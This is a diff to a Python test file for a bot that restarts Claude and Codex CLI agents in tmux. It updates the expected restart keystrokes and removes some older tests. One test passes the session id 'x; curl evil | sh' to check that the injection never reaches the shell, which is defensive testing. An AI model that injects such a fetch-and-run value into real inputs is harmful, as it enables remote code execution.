@@ -66,7 +66,7 @@ class TestWaitPaneReady:
 
 class TestRestartBusyGuard:
     @pytest.mark.asyncio
-    async def test_busy_tmux_agent_refused_with_alert(self, query):
+    async def test_busy_tmux_agent_refused_with_alert(self, query, monkeypatch):
         with (
             patch("kikubot.handlers.callbacks.session_manager") as sm,
             patch("kikubot.handlers.callbacks.tmux_manager") as tm,
@@ -78,7 +78,10 @@ class TestRestartBusyGuard:
             sm.get_window_state.return_value = MagicMock(session_id="sid")
             tm.find_window_by_id = AsyncMock(return_value=MagicMock())
             tm.capture_pane = AsyncMock(return_value="✻ Cooking… (esc to interrupt)")
+            sm.capture_pane = AsyncMock(return_value="✻ Cooking… (esc to interrupt)")
             tm.send_keys = AsyncMock()
+            monkeypatch.setattr("kikubot.handlers.agent_restart.tmux_manager", tm)
+            monkeypatch.setattr("kikubot.handlers.agent_restart.session_manager", sm)
 
             await _restart_agent(query, "@5", fresh=False)
 
@@ -90,6 +93,11 @@ class TestRestartBusyGuard:
     async def test_idle_tmux_agent_restarts(self, query, monkeypatch):
         async def _no_sleep(_):
             return None
+
+        # The session has a transcript to resume from.
+        monkeypatch.setattr(
+            "kikubot.runtimes.ClaudeRuntime.has_transcript", lambda self, sid: True
+        )
 
         monkeypatch.setattr(asyncio, "sleep", _no_sleep)
         with (
@@ -107,9 +115,13 @@ class TestRestartBusyGuard:
                 session_id="11111111-2222-3333-4444-555555555555", runtime="claude"
             )
             tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
-            tm.is_agent_running = AsyncMock(return_value=False)
+            # Running until /exit, back at the shell after it.
+            tm.is_agent_running = AsyncMock(side_effect=[True] + [False] * 5)
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
+            sm.clear_input = AsyncMock(return_value=True)
+            monkeypatch.setattr("kikubot.handlers.agent_restart.tmux_manager", tm)
+            monkeypatch.setattr("kikubot.handlers.agent_restart.session_manager", sm)
             # _wait_pane_ready polls session_manager.capture_pane until the
             # input box (chrome separator) renders — return a ready pane so it
             # returns on the first poll instead of looping to its timeout.
@@ -118,11 +130,12 @@ class TestRestartBusyGuard:
             await _restart_agent(query, "@5", fresh=False)
 
             sent = [c.args[1] for c in tm.send_keys.await_args_list]
-            # Restart now goes through the runtime's exit + launch commands
+            # Restart goes through the runtime's exit + launch commands
             # (claude: /exit → `claude --name … --resume …`), consistent with
-            # create_window.
+            # create_window; Ctrl-U at the shell clears any type-ahead first.
             assert sent == [
                 "/exit",
+                "C-u",
                 "claude --name proj --resume 11111111-2222-3333-4444-555555555555",
             ]
 
@@ -153,9 +166,13 @@ class TestRestartBusyGuard:
                 session_id="x; curl evil | sh", runtime="claude"
             )
             tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
-            tm.is_agent_running = AsyncMock(return_value=False)
+            # Running until the exit command, back at the shell after it.
+            tm.is_agent_running = AsyncMock(side_effect=[True] + [False] * 5)
+            sm.clear_input = AsyncMock(return_value=True)
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
+            monkeypatch.setattr("kikubot.handlers.agent_restart.tmux_manager", tm)
+            monkeypatch.setattr("kikubot.handlers.agent_restart.session_manager", sm)
             sm.capture_pane = AsyncMock(return_value="❯ \n" + "─" * 100 + "\n")
 
             await _restart_agent(query, "@5", fresh=False)
@@ -163,7 +180,7 @@ class TestRestartBusyGuard:
             sent = [c.args[1] for c in tm.send_keys.await_args_list]
             # launch_command validates the id (is_valid_session_id) — no --resume
             # appended, so the payload never reaches the shell line.
-            assert sent == ["/exit", "claude --name proj"]
+            assert sent == ["/exit", "C-u", "claude --name proj"]
             assert all("curl evil" not in s for s in sent)
 
     @pytest.mark.asyncio
@@ -193,9 +210,13 @@ class TestRestartBusyGuard:
             tm.find_window_by_id = AsyncMock(
                 return_value=MagicMock(window_name="myproject")
             )
-            tm.is_agent_running = AsyncMock(return_value=False)
+            # Running until the exit command, back at the shell after it.
+            tm.is_agent_running = AsyncMock(side_effect=[True] + [False] * 5)
+            sm.clear_input = AsyncMock(return_value=True)
             tm.capture_pane = AsyncMock(return_value="› ")
             tm.send_keys = AsyncMock()
+            monkeypatch.setattr("kikubot.handlers.agent_restart.tmux_manager", tm)
+            monkeypatch.setattr("kikubot.handlers.agent_restart.session_manager", sm)
             sm.capture_pane = AsyncMock(return_value="› \n" + "─" * 100 + "\n")
 
             await _restart_agent(query, "@9", fresh=False)
@@ -203,87 +224,9 @@ class TestRestartBusyGuard:
             sent = [c.args[1] for c in tm.send_keys.await_args_list]
             assert sent == [
                 "/quit",
+                "C-u",
                 "codex resume 019f0000-0000-7000-8000-000000000000",
             ]
-
-    @pytest.mark.asyncio
-    async def test_restart_flushes_lingering_exit_with_enter(self, query, monkeypatch):
-        """If the CLI hasn't exited before the relaunch (the «/exitclaude» bug —
-        /exit's Enter swallowed by slash-autocomplete), a bare Enter is sent to
-        flush the input line BEFORE the launch command, so the two never
-        concatenate onto one prompt line."""
-
-        async def _no_sleep(_):
-            return None
-
-        monkeypatch.setattr(asyncio, "sleep", _no_sleep)
-        with (
-            patch("kikubot.handlers.callbacks.session_manager") as sm,
-            patch("kikubot.handlers.callbacks.tmux_manager") as tm,
-            patch("kikubot.runtimes.config") as rcfg,
-            patch("kikubot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
-            patch("kikubot.handlers.callbacks._wait_pane_ready", new=AsyncMock()),
-            # Simulate /exit not taking → helper reports "still alive".
-            patch(
-                "kikubot.handlers.callbacks._wait_agent_exited",
-                new=AsyncMock(return_value=False),
-            ),
-        ):
-            rcfg.claude_command = "claude"
-            rcfg.usage_limits_enabled = False
-            sm._is_docker_binding.return_value = False
-            sm.is_agent_working.return_value = False
-            sm.get_window_state.return_value = MagicMock(
-                session_id="11111111-2222-3333-4444-555555555555", runtime="claude"
-            )
-            tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
-            tm.is_agent_running = AsyncMock(return_value=False)
-            tm.capture_pane = AsyncMock(return_value="❯ ")
-            tm.send_keys = AsyncMock()
-
-            await _restart_agent(query, "@5", fresh=False)
-
-            sent = [c.args[1] for c in tm.send_keys.await_args_list]
-            # /exit → flush Enter → launch (the Enter is the fix).
-            assert sent == [
-                "/exit",
-                "Enter",
-                "claude --name proj --resume 11111111-2222-3333-4444-555555555555",
-            ]
-
-
-class TestWaitAgentExited:
-    """The restart waits for the CLI to actually exit (pane back to a shell)
-    before typing the relaunch — the direct fix for the /exit-Enter race."""
-
-    @pytest.mark.asyncio
-    async def test_true_when_pane_back_to_shell(self):
-        from kikubot.handlers.callbacks import _wait_agent_exited
-
-        with patch("kikubot.handlers.callbacks.tmux_manager") as tm:
-            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
-            tm.is_agent_running = AsyncMock(return_value=False)
-            assert await _wait_agent_exited("@5", timeout=1.0) is True
-
-    @pytest.mark.asyncio
-    async def test_false_when_still_the_agent(self, monkeypatch):
-        from kikubot.handlers.callbacks import _wait_agent_exited
-
-        clock = {"t": 0.0}
-        monkeypatch.setattr(
-            "kikubot.handlers.callbacks.time.monotonic", lambda: clock["t"]
-        )
-
-        async def _tick(_):
-            clock["t"] += 0.5
-
-        with (
-            patch("kikubot.handlers.callbacks.tmux_manager") as tm,
-            patch("kikubot.handlers.callbacks.asyncio.sleep", new=_tick),
-        ):
-            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
-            tm.is_agent_running = AsyncMock(return_value=True)
-            assert await _wait_agent_exited("@5", timeout=1.0) is False
 
 
 class TestGuardedWid:
